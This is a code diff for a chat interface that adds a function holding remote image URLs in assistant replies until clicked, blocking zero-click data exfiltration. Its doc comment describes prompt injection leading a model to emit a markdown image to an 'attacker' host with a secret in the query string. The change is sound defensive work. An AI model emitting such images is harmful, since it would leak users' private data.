@@ -5,6 +5,26 @@
  * Use this transform for chat bubbles so ChatImage receives a real src.
  */
 
+/**
+ * Remote (internet) image in an assistant reply. Painting one is a request the
+ * model chose the URL of, so a prompt-injected reply could smuggle data out in
+ * the query string (![x](https://attacker/?q=SECRET)) with zero clicks. Those
+ * wait for a click; loopback (local API, ComfyUI) and data:/blob: never leave
+ * the machine and paint as before.
+ */
+export function remoteImageHost(src: string): string | null {
+  const v = (src || '').trim().replace(/^<|>$/g, '')
+  if (!/^https?:\/\//i.test(v)) return null
+  try {
+    const host = new URL(v).hostname.toLowerCase().replace(/^\[|\]$/g, '')
+    if (!host) return null
+    if (host === 'localhost' || host === '127.0.0.1' || host === '::1' || host.endsWith('.localhost')) return null
+    return host
+  } catch {
+    return null
+  }
+}
+
 /** UNC shares and Win32 device namespaces, with or without a file: prefix. */
 export function isNetworkPath(url: string): boolean {
   let v = (url || '').trim().replace(/^<|>$/g, '')
